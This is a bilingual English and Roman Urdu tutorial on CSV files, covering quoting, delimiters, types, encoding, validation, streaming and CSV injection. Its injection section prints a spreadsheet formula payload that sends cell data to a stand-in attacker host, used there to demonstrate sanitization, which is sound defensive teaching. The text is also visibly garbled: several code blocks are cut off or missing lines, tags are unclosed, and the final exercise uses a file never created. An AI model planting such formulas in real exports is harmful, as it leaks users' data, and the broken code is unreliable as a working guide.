<BigIdea>
<Tr>
<En>
**CSV** (Comma-Separated Values) is the simplest table format: **one row per line**, values separated by **commas**, usually with a **header row**. Every spreadsheet, database, bank and CRM can export and import it. It looks trivial, but real files have traps: a value containing a comma, quote or new line must be **wrapped in double quotes**, and an inner quote is **doubled**, so **never parse CSV with `split(",")`**. CSV has **no types** (everything is text) and no single standard for delimiter, encoding or line endings; Excel silently changes IDs, phone numbers and dates. And a cell starting with `=` can run as a **formula** in a spreadsheet (**CSV injection**), so sanitize exports.
</En>
<Ur>
**CSV** (Comma-Separated Values) sab se saada table format hai: **har line ek row**, values **commas** se alag, aam tor par ek **header row** ke saath. Har spreadsheet, database, bank aur CRM ise export aur import kar sakta hai. Mamooli lagta hai, lekin asli files me jaal hain: jis value me comma, quote ya nayi line ho use **double quotes me lapetna** padta hai, aur andar ka quote **dohra** hota hai, isliye **CSV kabhi `split(",")` se parse na karein**. CSV me **qisamen nahi** (sab text) aur delimiter, encoding ya line endings ka ek standard nahi; Excel chupke se IDs, phone numbers aur tareekhen badal deta hai. Aur `=` se shuru cell spreadsheet me **formula** ban kar chal sakta hai (**CSV injection**), isliye exports saaf karein.
</Ur>
</Tr>
</BigIdea>

## At a glance

<Glance>
<What>
<Tr>
<En>

```text
name,roll_no,city,fee_paid
Sam Lee,17,Chicago,true
"Brown, Emma",22,"Chicago, Illinois",false
Jack,05,Houston,true
```

As a table:

| name | roll_no | city | fee_paid |
| --- | --- | --- | --- |
| Sam Lee | 17 | Chicago | true |
| Brown, Emma | 22 | Chicago, Illinois | false |
| Jack | 05 | Houston | true |

The closest thing to a standard is **RFC 4180** (2005). It describes common rules, but many programs differ slightly, which is why CSV is "simple" and still causes so many bugs.

<En>

## Picture it

<Tr>
<En>

Imagine dictating a **class register** over the phone: "Name comma Roll number comma City, new line, Sam comma 17 comma Chicago, new line…". The listener writes it into a table. That works until someone's city is "Chicago, Illinois": an extra comma, and the columns slip. So you agree: "if a value contains a comma, I'll say **quote** before and after it". That's CSV: a very simple agreement plus a few rules for the awkward cases. Everyone can do it, but only if both sides follow the same rules.

Har koi kar sakta hai, lekin sirf tab jab dono taraf ek hi qawaid follow karen.

## Learn it step by step

<Walkthrough>

<Step title="Rows, columns and the header">

<Tr>
<En>

Each line is a **row**, commas split it into **fields**, and the first row usually holds **column names**. With a header, programs refer to columns by **name** (`row["city"]`), so they keep working if columns are reordered. Python's built-in `csv` module: `csv.reader` gives lists, `csv.DictReader` gives a dictionary per row. Every row should have the **same number of fields** as the header; a missing or extra one means a broken file.

</En>
<Ur>

Har line ek **row** hai, commas use **fields** me baant-te hain, aur pehli row aam tor par **columns ke naam** rakhti hai. Header ke saath programs columns ko **naam** (`row["city"]`) se pukarte hain, isliye columns ki tarteeb badalne par bhi chalte rehte hain. Python ka andar bana `csv` module: `csv.reader` lists deta hai, `csv.DictReader` har row ki dictionary. Har row me header jitne hi **fields** hon; kam ya zyada ka matlab tooti file.

</Ur>
</Tr>

```bash
cat > students.csv <<'EOF'
name,roll_no,city,fee_paid
Sam Lee,17,Chicago,true
"Brown, Emma",22,"Chicago, Illinois",false
Jack,05,Houston,true
EOF
python3 - <<'PY'
import csv
with open("students.csv", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)
    print("columns:", reader.fieldnames)
    for row in reader:
        print(f"  {row['name']:11} | roll {row['roll_no']:>2} | {row['city']}")
PY
```

```text output
columns: ['name', 'roll_no', 'city', 'fee_paid']
  Sam Lee     | roll 17 | Chicago
  Brown, Emma | roll 22 | Chicago, Illinois
  Jack        | roll 05 | Houston
```

<Happened>
<Tr>
<En>`newline=""` lets the csv module handle line endings itself (needed for fields containing new lines). `DictReader` read the header and returned each row as a dictionary. `"Brown, Emma"` and `"Chicago, Illinois"` came out **with** their commas because they were quoted, and Jack's roll is still `05`: the csv module never converts types.</En>
<Ur>`newline=""` csv module ko line endings khud sambhalne deta hai (nayi lines wale fields ke liye zaroori). `DictReader` ne header parha aur har row dictionary ki shakal me di. `"Brown, Emma"` aur `"Chicago, Illinois"` apne commas **samet** aaye kyun ke quote the, aur Jack ka roll ab bhi `05` hai: csv module kabhi qisamen nahi badalta.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Why split(&quot;,&quot;) breaks">

<Tr>
<En>

Splitting each line on commas ignores quoting, so any field containing a comma is cut into pieces and the columns shift. It works on test data until a real address, company name or `1,500` arrives. `line.split(",")`, `cut -d,` and `awk -F,` are all naive. Always use a CSV parser: Python `csv`, Node `csv-parse` or Papa Parse, PostgreSQL `COPY`, or csvkit, Miller and DuckDB on the command line.

</En>
<Ur>

Har line ko commas par torna quoting nazar andaz karta hai, isliye comma wala har field tukron me kat jata hai aur columns khisak jate hain. Test data par chalta hai jab tak asli address, company ka naam ya `1,500` na aa jaye. `line.split(",")`, `cut -d,` aur `awk -F,` sab bhole hain. Hamesha CSV parser istemal karein: Python `csv`, Node `csv-parse` ya Papa Parse, PostgreSQL `COPY`, ya command line par csvkit, Miller aur DuckDB.

</Ur>
</Tr>

```bash
echo "--- naive: cut -d, -f3 (the city column):"
cut -d, -f3 students.csv
echo "--- naive Python split:"
python3 -c '
for line in open("students.csv"):
    parts = line.rstrip("\n").split(",")
    print(f"  {len(parts)} fields: {parts}")' | sed -n 3p
echo "--- real CSV parser:"
python3 -c '
import csv
for row in csv.reader(open("students.csv", newline="")):
    print(f"  {len(row)} fields, city = {row[2]!r}")' | sed -n 3p
```

```text output
--- naive: cut -d, -f3 (the city column):
city
Chicago
22
Houston
--- naive Python split:
  6 fields: ['"Brown', ' Emma"', '22', '"Chicago', ' Illinois"', 'false']
--- real CSV parser:
  4 fields, city = 'Chicago, Illinois'
```

<Happened>
<Tr>
<En>`cut -d, -f3` printed `22`, Emma's roll number, as her **city**. The naive split gave **6** fields, with quotes left as characters and her name and city each cut in two. `csv.reader` understood the quotes: 4 fields, and the full city. (`sed -n 3p` just shows Emma's row.)</En>
<Ur>`cut -d, -f3` ne `22`, Emma ka roll number, us ka **sheher** bana kar chhaapa. Bhole split ne **6** fields diye, quotes huroof ki tarah reh gaye aur naam aur sheher dono do tukre. `csv.reader` ne quotes samjhe: 4 fields, aur poora sheher. (`sed -n 3p` sirf Emma ki row dikhata hai.)</Ur>
</Tr>
</Happened>

</Step>

<Step title="Quoting rules: commas, quotes and new lines">

<Tr>
<En>

RFC 4180: a field containing the **delimiter**, a **double quote** or a **line break** must be enclosed in double quotes, and a quote inside it is written **twice** (`""`). That's the only way a reader can tell "comma inside a value" from "comma between values". Writers do this automatically (Python `csv.writer`, Node `csv-stringify`, Excel, PostgreSQL `COPY ... TO`). **Never write CSV by joining strings with commas.**

</En>
<Ur>

RFC 4180: jis field me **delimiter**, **double quote** ya **nayi line** ho use double quotes me band karna lazmi, aur andar ka quote **do dafa** (`""`) likha jata hai. Parhne wale ke liye "value ke andar comma" aur "values ke beech comma" me farq karne ka yahi wahid tareeqa hai. Writers ye khud karte hain (Python `csv.writer`, Node `csv-stringify`, Excel, PostgreSQL `COPY ... TO`). **CSV kabhi strings ko commas se jor kar na likhein.**

</Ur>
</Tr>

```bash
python3 - <<'PY'
import csv, sys
rows = [
    ["sku", "description", "price"],
    ["TV-55", '55" 4K TV, smart', "89999"],
    ["MUG-01", "Mug\nwith handle", "800"],
    ["CAP-02", "Plain cap", "450"],
]
with open("products.csv", "w", newline="", encoding="utf-8") as f:
    csv.writer(f).writerows(rows)
print(open("products.csv", encoding="utf-8").read(), end="")
print("--- read back:")
for row in csv.reader(open("products.csv", newline="", encoding="utf-8")):
    print(" ", row)
PY
```

```text output
sku,description,price
TV-55,"55"" 4K TV, smart",89999
MUG-01,"Mug
with handle",800
CAP-02,Plain cap,450
--- read back:
  ['sku', 'description', 'price']
  ['TV-55', '55" 4K TV, smart', '89999']
  ['MUG-01', 'Mug\nwith handle', '800']
  ['CAP-02', 'Plain cap', '450']
```

<Happened>
<Tr>
<En>`55" 4K TV, smart` has a quote **and** a comma, so it became `"55"" 4K TV, smart"`. `Mug\nwith handle` has a line break, so one record spans **two physical lines**: "one line = one row" isn't always true, and `wc -l` doesn't count rows reliably. `Plain cap` needed no quotes. Reading back gave the exact originals.</En>
<Ur>`55" 4K TV, smart` me quote **aur** comma hai, isliye `"55"" 4K TV, smart"` bana. `Mug\nwith handle` me nayi line hai, isliye ek record **do asli lines** par phaila: "ek line = ek row" hamesha sach nahi, aur `wc -l` rows ko bharose se nahi ginta. `Plain cap` ko quotes nahi chahiye the. Wapas parhne par bilkul asal values milin.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Other delimiters: semicolons, tabs and pipes">

<Tr>
<En>

"CSV" files don't always use commas. **Semicolons** are common where the comma is the decimal separator (Excel in Germany, France, Turkey…); **TSV** uses tabs; some systems use `|`. Guess wrong and every row becomes one big field. Python: `csv.reader(f, delimiter=";")`, or `csv.Sniffer()` to guess. TSV is often the safest export, because tabs rarely appear in real data.

</En>
<Ur>

"CSV" files hamesha commas istemal nahi karti. **Semicolons** wahan aam hain jahan comma decimal ka nishan hai (Germany, France, Turkey… me Excel); **TSV** tabs istemal karta hai; kuch systems `|`. Ghalat andaza lagayen to har row ek bara field ban jati hai. Python: `csv.reader(f, delimiter=";")`, ya andaze ke liye `csv.Sniffer()`. TSV aksar sab se mehfooz export hai, kyun ke asli data me tabs kam hi hote hain.

</Ur>
</Tr>

```bash
printf 'name;city;amount\nSam Lee;Chicago;1.500,50\nEmma Brown;Houston;250,00\n' > bank-export.csv
python3 - <<'PY'
import csv
sample = open("bank-export.csv", encoding="utf-8").read(1024)
dialect = csv.Sniffer().sniff(sample)
print("guessed delimiter:", repr(dialect.delimiter))
with open("bank-export.csv", newline="", encoding="utf-8") as f:
    for row in csv.DictReader(f, delimiter=";"):
        amount = float(row["amount"].replace(".", "").replace(",", "."))
        print(f"  {row['name']:10} {amount:>9.2f}")
PY
printf 'name\tcity\nSam Lee\tChicago\n' | python3 -c 'import csv, sys; print("TSV row:", list(csv.reader(sys.stdin, delimiter="\t"))[1])'
```

```text output
guessed delimiter: ';'
  Sam Lee      1500.50
  Emma Brown    250.00
TSV row: ['Sam Lee', 'Chicago']
```

<Happened>
<Tr>
<En>The bank file uses `;` and the European number format `1.500,50` (dot for thousands, comma for decimals). `Sniffer` guessed `;` from the first 1 KB (it's a guess, so set the delimiter explicitly for known sources). Removing the thousands dots and turning the decimal comma into a dot gave `1500.50`. The last line read a TSV row with `delimiter="\t"`.</En>
<Ur>Bank file `;` aur European number format `1.500,50` (hazar ke liye dot, ashariya ke liye comma) istemal karti hai. `Sniffer` ne pehle 1 KB se `;` ka andaza lagaya (ye andaza hai, isliye maloom sources ke liye delimiter khud set karein). Hazar wale dots hata kar aur ashariya ka comma dot bana kar `1500.50` mila. Aakhri line ne `delimiter="\t"` se TSV row parhi.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Everything is text: types, leading zeros and Excel">

<Tr>
<En>

CSV has **no types**: `05`, `true`, `2026-11-10` and `1500` are just characters, and spreadsheets decide what they mean **automatically**. That destroys data: Excel removes leading zeros, turns long numbers into `1.23E+15`, turns `1-2` into dates, and has even renamed human genes like `SEPT2` and `MARCH1` in scientific spreadsheets. Watch IDs, national ID and phone numbers, ZIP codes, account numbers, product codes and dates. In code, convert columns **deliberately**; in Excel, import with **Data → From Text/CSV** and set those columns to **Text**.

</En>
<Ur>

CSV me **qisamen nahi**: `05`, `true`, `2026-11-10` aur `1500` sirf huroof hain, aur spreadsheets **khud** tay karti hain in ka matlab kya hai. Is se data barbaad hota hai: Excel shuru ke zero hata deta hai, lambe numbers ko `1.23E+15` bana deta hai, `1-2` ko tareekh, aur scientific spreadsheets me `SEPT2` aur `MARCH1` jaise insani genes ke naam tak badal chuka hai. IDs, qomi shanakhti aur phone numbers, ZIP codes, account numbers, product codes aur tareekhon par nazar rakhein. Code me columns **soch samajh kar** badlein; Excel me **Data → From Text/CSV** se import kar ke wo columns **Text** par set karein.

</Ur>
</Tr>

```bash
cat > customers.csv <<'EOF'
customer_id,phone,national_id,joined,balance
00042,01632960123,AB123456C,2026-01-15,1500.75
00107,01632960456,CD654321A,2026-03-02,-200.00
EOF
python3 - <<'PY'
import csv
from datetime import date
from decimal import Decimal
with open("customers.csv", newline="", encoding="utf-8") as f:
    for row in csv.DictReader(f):
        customer = {
            "customer_id": row["customer_id"],                 # keep as text: leading zeros matter
            "phone": row["phone"],                             # text: never do maths on phone numbers
            "joined": date.fromisoformat(row["joined"]),       # real date
            "balance": Decimal(row["balance"]),                # exact decimal for money
        }
        print(customer["customer_id"], customer["phone"], customer["joined"].strftime("%d %b %Y"), customer["balance"] + Decimal("0.25"))
print("what a spreadsheet would show for the ID and phone if guessed as numbers:", int("00042"), int("01632960123"))
PY
```

```text output
00042 01632960123 15 Jan 2026 1501.00
00107 01632960456 02 Mar 2026 -199.75
what a spreadsheet would show for the ID and phone if guessed as numbers: 42 1632960123
```

<Happened>
<Tr>
<En>`customer_id` and `phone` stayed **strings**, so `00042` and the phone's leading `0` survived. `date.fromisoformat` made a real date we can format (`15 Jan 2026`), and `Decimal` kept money exact (`1500.75 + 0.25 = 1501.00`). The last line shows what Excel does on double-click: the ID becomes `42` and the phone loses its `0`. If someone then **saves**, the originals are gone for good.</En>
<Ur>`customer_id` aur `phone` **strings** rahe, isliye `00042` aur phone ka shuru ka `0` bach gaya. `date.fromisoformat` ne asli tareekh banayi jise format kar sakte hain (`15 Jan 2026`), aur `Decimal` ne paise bilkul theek rakhe (`1500.75 + 0.25 = 1501.00`). Aakhri line dikhati hai double-click par Excel kya karta hai: ID `42` ban jati hai aur phone `0` kho deta hai. Phir koi **save** kar de to asal values hamesha ke liye gayin.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Encoding and the BOM">

<Tr>
<En>

A CSV file is bytes, and the **encoding** says which characters they are: use **UTF-8**. Excel often adds a **BOM**, the 3 bytes `EF BB BF` at the start. Without it, older Excel opens UTF-8 as a Western encoding, so `Zürich` becomes `ZÃ¼rich`. **With** it, programs that don't expect it read the first column name as `\ufeffname`, and `row["name"]` fails. In Python, read with `encoding="utf-8-sig"` (strips a BOM if present, works without one), and write with `utf-8-sig` for files meant for Excel. Check with `head -c 3 file.csv | od -An -tx1`.

</En>
<Ur>

CSV file bytes hai, aur **encoding** batati hai wo kaunse huroof hain: **UTF-8** istemal karein. Excel aksar **BOM** jorta hai, shuru me 3 bytes `EF BB BF`. Is ke baghair purana Excel UTF-8 ko Western encoding me kholta hai, to `Zürich` `ZÃ¼rich` ban jata hai. Is ke **saath**, jo programs is ki umeed nahi karte wo pehle column ka naam `\ufeffname` parhte hain, aur `row["name"]` fail hota hai. Python me `encoding="utf-8-sig"` se parhein (BOM ho to hatata hai, na ho to bhi chalta hai), aur Excel ke liye files `utf-8-sig` se likhein. `head -c 3 file.csv | od -An -tx1` se check karein.

</Ur>
</Tr>

```bash
printf '\xef\xbb\xbfname,city\nSam,Zürich\n' > from-excel.csv
head -c 3 from-excel.csv | od -An -tx1
python3 - <<'PY'
import csv
plain = csv.DictReader(open("from-excel.csv", encoding="utf-8", newline=""))
print("utf-8     header:", plain.fieldnames)
row = next(plain)
print("row['name'] works?", "name" in row)
sig = csv.DictReader(open("from-excel.csv", encoding="utf-8-sig", newline=""))
row = next(sig)
```

<Step title="Line endings">

<Tr>
<En>

RFC 4180 says records end with **CRLF** (`\r\n`, Windows style); Unix tools usually write **LF** (`\n`). Unexpected endings leave a stray `\r` on the last field (`"Chicago\r"`), which breaks `city == "Chicago"`. Python's csv writer uses `\r\n` by default (`lineterminator="\n"` changes it); always open CSVs with `newline=""`. Shell tools like `awk` don't remove `\r`: clean with `tr -d '\r'` or `dos2unix`.

</En>
<Ur>

RFC 4180 kehta hai records **CRLF** (`\r\n`, Windows andaaz) par khatam hon; Unix tools aam tor par **LF** (`\n`) likhte hain. Ghair mutawaqqa endings aakhri field par bhatka `\r` chhor dete hain (`"Chicago\r"`), jo `city == "Chicago"` tor deta hai. Python ka csv writer default me `\r\n` istemal karta hai (`lineterminator="\n"` badalta hai); CSV hamesha `newline=""` se kholein. `awk` jaise shell tools `\r` nahi hatate: `tr -d '\r'` ya `dos2unix` se saaf karein.

</Ur>
</Tr>

```bash
python3 -c 'import csv; csv.writer(open("crlf.csv", "w", newline="")).writerow(["Sam", "Chicago"])'
od -c crlf.csv | head -1
printf 'name,city\r\nSam,Chicago\r\n' > windows.csv
awk -F, 'NR==2 { print "awk sees city == Chicago? " ($2 == "Chicago" ? "yes" : "no (it is Chicago\\r)") }' windows.csv
tr -d '\r' < windows.csv | awk -F, 'NR==2 { print "after tr -d: " ($2 == "Chicago" ? "yes" : "no") }'
```

```text output

awk sees city == Chicago? no (it is Chicago\r)
after tr -d: yes
```

<Happened>
<Tr>
<En>`od -c` showed Python's writer ending the row with `\r\n`. In the Windows file, `awk`'s last field was `Chicago\r`, so the comparison failed; after `tr -d '\r'` removed carriage returns, it worked.</En>
<Ur>`od -c` ne dikhaya Python ka writer row `\r\n` par khatam karta hai. Windows file me `awk` ka aakhri field `Chicago\r` tha, isliye muqabla fail hua; `tr -d '\r'` ke carriage returns hatane ke baad chal gaya.</Ur>

</Happened>

<Step title="CSV ⇄ JSON">

<Tr>
<En>

Each CSV row maps to a JSON **object** (header names as keys), and the whole file to an **array**. APIs want JSON; spreadsheets and finance teams want CSV. Python: `DictReader` + `json.dump`, and `json.load` + `DictWriter`; JavaScript: Papa Parse or `csv-parse`/`csv-stringify`. Going JSON → CSV, nested data must be **flattened** (`address.city` becomes a column) and lists joined into one cell or exploded into rows.

</En>
<Ur>

Har CSV row ek JSON **object** (header ke naam keys) ban jati hai, aur poori file ek **array**. APIs JSON chahti hain; spreadsheets aur finance teams CSV. Python: `DictReader` + `json.dump`, aur `json.load` + `DictWriter`; JavaScript: Papa Parse ya `csv-parse`/`csv-stringify`. JSON → CSV me andar wala data **seedha** karna padta hai (`address.city` column banta hai) aur fehristen ek cell me jori ya rows me phailayi jati hain.

</Ur>
</Tr>

```bash
python3 - <<'PY'
import csv, json
with open("students.csv", newline="", encoding="utf-8") as f:
    students = [
        {**row, "roll_no": int(row["roll_no"]), "fee_paid": row["fee_paid"] == "true"}
        for row in csv.DictReader(f)
    ]
print(json.dumps(students[1]))

orders = [
    {"id": 1, "customer": {"name": "Sam", "city": "Chicago"}, "items": ["MUG-01", "CAP-02"]},
    {"id": 2, "customer": {"name": "Emma", "city": "Houston"}, "items": ["TV-55"]},
]
with open("orders.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=["id", "customer_name", "customer_city", "items"], lineterminator="\n")
    writer.writeheader()
    for o in orders:
        writer.writerow({"id": o["id"], "customer_name": o["customer"]["name"],
                         "customer_city": o["customer"]["city"], "items": "|".join(o["items"])})
print(open("orders.csv").read(), end="")
PY
```


<Happened>
<Tr>
<En>**CSV → JSON:** `{**row, ...}` copied each row and overrode two keys with real types (`roll_no` integer, `fee_paid` boolean); converting types at this boundary is your job. **JSON → CSV:** `DictWriter` needs the column list; the nested `customer` was flattened into two columns and the `items` list joined with `|`.</En>
<Ur>**CSV → JSON:** `{**row, ...}` ne har row copy ki aur do keys asli qisamon se badlin (`roll_no` integer, `fee_paid` boolean); is sarhad par qisamen badalna aap ka kaam hai. **JSON → CSV:** `DictWriter` ko columns ki fehrist chahiye; andar wala `customer` do columns me seedha hua aur `items` fehrist `|` se jori gayi.</Ur>

<Step title="Validate uploaded CSV files">

<Tr>
<En>

Users upload whatever their spreadsheet exported, and importing half a file then failing on row 812 leaves your database messy. Check **before** importing anything: required columns, field count, types and formats, allowed values, duplicates. Report problems **with row numbers** that match Excel (header = row 1), import only when there are **zero** errors, and wrap the import in a database transaction.

</En>
<Ur>

Users wahi upload karte hain jo un ki spreadsheet ne export kiya, aur aadhi file import kar ke row 812 par fail hona database ko gadla chhorta hai. Kuch bhi import karne se **pehle** check karein: lazmi columns, fields ki ginti, qisamen aur formats, ijazat wali values, dohri entries. Masle Excel se milte **row numbers** ke saath batayen (header = row 1), sirf **sifar** errors par import karein, aur import ko database transaction me lapetein.

</Ur>
</Tr>

```bash
cat > upload.csv <<'EOF'
sku,name,price,stock
MUG-01,Coffee mug,800,25
CAP-02,Cap,abc,10
,Water bottle,1200,5
MUG-01,Coffee mug (dup),800,3
TV-55,"55"" TV",89999
EOF
python3 - <<'PY'
import csv
REQUIRED = ["sku", "name", "price", "stock"]
errors, seen = [], set()
with open("upload.csv", newline="", encoding="utf-8-sig") as f:
    reader = csv.reader(f)
    header = next(reader)
    missing = [c for c in REQUIRED if c not in header]
    if missing:
        raise SystemExit(f"missing columns: {missing}")
    for line_no, fields in enumerate(reader, start=2):
        if len(fields) != len(header):
            errors.append(f"row {line_no}: expected {len(header)} fields, got {len(fields)}")
            continue
        row = dict(zip(header, fields))
        if not row["sku"]:
            errors.append(f"row {line_no}: sku is empty")
        elif row["sku"] in seen:
            errors.append(f"row {line_no}: duplicate sku {row['sku']}")
        seen.add(row["sku"])
        if not row["price"].isdigit():
            errors.append(f"row {line_no}: price {row['price']!r} is not a whole number")
print("\n".join(errors) if errors else "file OK")
print(f"{len(errors)} problem(s): nothing imported" if errors else "importing...")
PY
```

```text output
row 3: price 'abc' is not a whole number
row 4: sku is empty
row 5: duplicate sku MUG-01
row 6: expected 4 fields, got 3
4 problem(s): nothing imported
```

<Happened>
<Tr>
<En>`utf-8-sig` accepted files with or without a BOM, and the header was checked for required columns first. `enumerate(reader, start=2)` numbered rows like Excel. Each row was checked for field count, a non-empty unique `sku`, and a whole-number `price`; all errors were shown together so the user can fix the file in one go, and nothing was imported.</En>
<Ur>`utf-8-sig` ne BOM ke saath ya baghair files maanin, aur pehle header me lazmi columns check hue. `enumerate(reader, start=2)` ne rows Excel ki tarah ginin. Har row ke fields ki ginti, khaali na hone wala alag `sku`, aur poore number wali `price` check hui; saare errors ek saath dikhaye gaye taa ke user ek hi dafa file theek kare, aur kuch import nahi hua.</Ur>
</Tr>
</Happened>

</Step>

<Step title="Big files: stream, don't load everything">

<Tr>
<En>

CSV exports can be millions of rows and gigabytes. `list(csv.reader(f))`, `f.read()` or opening a 2 GB file in Excel (limit: 1,048,576 rows) can run out of memory or fail. **Streaming** reads one row at a time and keeps only running totals. Python's `csv.reader` already streams in a `for` loop; for analysis, **pandas** (`chunksize`), **DuckDB** and **Polars** are very fast, and PostgreSQL's `COPY` loads data into a database. For repeated analysis, convert to **Parquet**.

</En>
<Ur>

CSV exports lakhon rows aur gigabytes ki ho sakti hain. `list(csv.reader(f))`, `f.read()` ya 2 GB file Excel me kholna (hadd: 1,048,576 rows) memory khatam kar sakta ya fail ho sakta hai. **Streaming** ek waqt me ek row parhti hai aur sirf chalte totals rakhti hai. Python ka `csv.reader` `for` loop me pehle se stream karta hai; tajziye ke liye **pandas** (`chunksize`), **DuckDB** aur **Polars** bohot tez hain, aur PostgreSQL ka `COPY` data database me daalta hai. Baar baar tajziye ke liye **Parquet** me badlein.

</Ur>
</Tr>

```bash
python3 - <<'PY'

random.seed(42)
cities = ["Chicago", "Houston", "Seattle", "Boston", "Denver"]
with open("sales.csv", "w", newline="") as f:
    w = csv.writer(f, lineterminator="\n")
    w.writerow(["order_id", "city", "amount"])
    for i in range(1, 200_001):
        w.writerow([i, random.choice(cities), random.randint(100, 5000)])
PY
echo "file size: $(wc -c < sales.csv) bytes, lines: $(wc -l < sales.csv)"

from collections import Counter
totals, count = Counter(), 0

        totals[row["city"]] += int(row["amount"])
        count += 1
print(f"{count:,} orders streamed")
for city, total in totals.most_common():
    print(f"  {city:10} ${total:,}")
PY
```

<En>The first script generated 200,000 test orders; `random.seed(42)` makes the "random" data identical every run. The file is about 3.8 MB with 200,001 lines. <Ur>Pehli script ne 200,000 test orders banaye; `random.seed(42)` "random" data ko har dafa ek jaisa rakhta hai. File takreeban 3.8 MB ki hai aur 200,001 lines. <Step title="CSV injection (formula injection)">

<Tr>
<En>

Spreadsheets treat a cell starting with `=`, `+`, `-` or `@` (and sometimes tab or carriage return) as a **formula**. If your app exports user text, an attacker can store `=HYPERLINK("http://evil.example/?leak="&A2, "Click for invoice")`, which runs when an admin opens the export: it can send other cells' data (emails, salaries) to the attacker or show fake warnings. OWASP's fix: prefix risky **text** cells with `'` so they display as text, but leave real numbers like `-500` alone. Also validate input (does a name need to start with `=`?).

</En>
<Ur>

Spreadsheets `=`, `+`, `-` ya `@` (aur kabhi tab ya carriage return) se shuru cell ko **formula** samajhti hain. Agar aap ki app user ka text export kare, hamla awar `=HYPERLINK("http://evil.example/?leak="&A2, "Click for invoice")` save kar sakta hai, jo admin ke export kholte hi chalta hai: doosre cells ka data (emails, tankhwahen) hamla awar ko bhej sakta hai ya jaali warnings dikha sakta hai. OWASP ka hal: khatarnak **text** cells ke aage `'` lagayen taa ke text dikhen, lekin `-500` jaise asli numbers ko na chhed-en. Input bhi validate karein (kya naam `=` se shuru hona zaroori hai?).

</Ur>
</Tr>

```bash
python3 - <<'PY'
import csv, re
NUMBER = re.compile(r"-?\d+(\.\d+)?")

def safe_cell(value):
    text = str(value)
    if NUMBER.fullmatch(text):
        return text                           # a real number: leave it alone
    if text[:1] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + text                     # would start a formula: force text
    return text

customers = [
    ["name", "phone", "balance", "note"],
    ["Sam Lee", "+1 555 0100", -500, "VIP"],
    ['=HYPERLINK("http://evil.example/?d="&B3,"Click for invoice")', "020 7946 0000", 1200, "@SUM(1+1)"],
]
with open("export.csv", "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f, lineterminator="\n")
    for row in customers:
        w.writerow([safe_cell(v) for v in row])
print(open("export.csv").read(), end="")
PY
```

```text output
name,phone,balance,note
Sam Lee,'+1 555 0100,-500,VIP
"'=HYPERLINK(""http://evil.example/?d=""&B3,""Click for invoice"")",020 7946 0000,1200,'@SUM(1+1)
```

<Happened>
<Tr>
<En>`NUMBER` matched plain numbers like `-500`, which stayed numeric. Other values starting with `=`, `+`, `-`, `@`, tab or carriage return got a leading `'`: the phone `+1 555 0100` now shows as text (and Excel won't try to calculate it), and the attacker's `=HYPERLINK(...)` is displayed as harmless text instead of a data-stealing link. The csv writer also quoted it and doubled its inner quotes.</En>
<Ur>`NUMBER` ne `-500` jaise saade numbers pakre, jo number hi rahe. `=`, `+`, `-`, `@`, tab ya carriage return se shuru doosri values ke aage `'` laga: phone `+1 555 0100` ab text dikhta hai (aur Excel use hisaab nahi karega), aur hamla awar ka `=HYPERLINK(...)` data churane wale link ke bajaye be-zarar text dikhta hai. csv writer ne use quote bhi kiya aur andar ke quotes dohre kiye.</Ur>
</Tr>
</Happened>

</Step>

</Walkthrough>

## Common mistakes

<Compare>
<Bad title="Join strings, split strings">

```text
line = ",".join([name, address, amount])      # "House 12, Street 4" shifts columns
for line in open("orders.csv"):
    sku, desc, price = line.split(",")        # breaks on quoted commas
```

</Bad>
<Good title="A real CSV writer and reader">

```text
csv.writer(f).writerow([name, address, amount])
for row in csv.DictReader(open("orders.csv", newline="", encoding="utf-8-sig")):
    price = Decimal(row["price"])
```

</Good>
</Compare>

<Tr>
<En>

More mistakes to avoid:

- **Opening and re-saving a CSV in Excel**, which strips leading zeros, reformats dates and turns long numbers into `1.23E+15`.
- **Assuming one line = one row:** quoted fields can contain new lines.
- **Ignoring the BOM** (a `\ufeffname` column) or the encoding (garbled accented or non-Latin text).
- **Guessing the delimiter wrong** for files from other countries (`;`).
- **Ambiguous dates** like `03/11/2026`. Use ISO `YYYY-MM-DD`.
- **Floats for money**, and thousands separators left inside numbers (`1,500`).
- **Importing row by row without validating** the whole file first.
- **Exporting user text without formula sanitization.**

</En>
<Ur>

Bachne wali mazeed ghaltiyan:

- **CSV ko Excel me khol kar dobara save karna**, jo shuru ke zero hatata, tareekhen badalta aur lambe numbers `1.23E+15` banata hai.
- **Samajhna ek line = ek row:** quoted fields me nayi lines ho sakti hain.
- **BOM** (`\ufeffname` column) ya encoding (bigra accent wala ya ghair Latin text) **nazar andaz karna**.
- Doosre mulkon ki files ke liye **delimiter ka ghalat andaza** (`;`).
- `03/11/2026` jaisi **mubham tareekhen**. ISO `YYYY-MM-DD` istemal karein.
- **Paison ke liye floats**, aur numbers ke andar hazar ke nishan reh jana (`1,500`).
- **Poori file validate kiye baghair row ba row import.**
- **Formula ki safai ke baghair user ka text export karna.**

</Ur>
</Tr>

Excel se export hue statement me BOM, semicolons, `dd/mm/yyyy` tareekhen, European numbers, fields ke andar quotes aur ek bad-niyat tafseel hai. Saaf, mehfooz CSV banayen aur check karein ke balances jurte hain.

```bash

python3 - <<'PY'
import csv
from datetime import datetime
from decimal import Decimal

def money(text):
    return Decimal(text.replace(".", "").replace(",", ".")) if text else Decimal("0")

def safe_text(value):
    return "'" + value if value[:1] in ("=", "+", "-", "@", "\t", "\r") else value

rows = []
with open("statement.csv", newline="", encoding="utf-8-sig") as f:
    for r in csv.DictReader(f, delimiter=";"):
        rows.append({
            "date": datetime.strptime(r["Date"], "%d/%m/%Y").date().isoformat(),
            "description": safe_text(r["Description"]),
            "amount": money(r["Credit"]) - money(r["Debit"]),
            "balance": money(r["Balance"]),
        })

with open("statement-clean.csv", "w", newline="", encoding="utf-8") as f:
    w = csv.DictWriter(f, fieldnames=["date", "description", "amount", "balance"], lineterminator="\n")
    w.writeheader()
    w.writerows(rows)
print(open("statement-clean.csv").read(), end="")

income = sum(r["amount"] for r in rows if r["amount"] > 0)
spent = -sum(r["amount"] for r in rows if r["amount"] < 0)
opening = rows[0]["balance"]
ok = opening + income - spent == rows[-1]["balance"]
print(f"income {income:,.2f} | spent {spent:,.2f} | balance check: {'OK' if ok else 'MISMATCH'}")
PY
```

## Remember

<Takeaways>
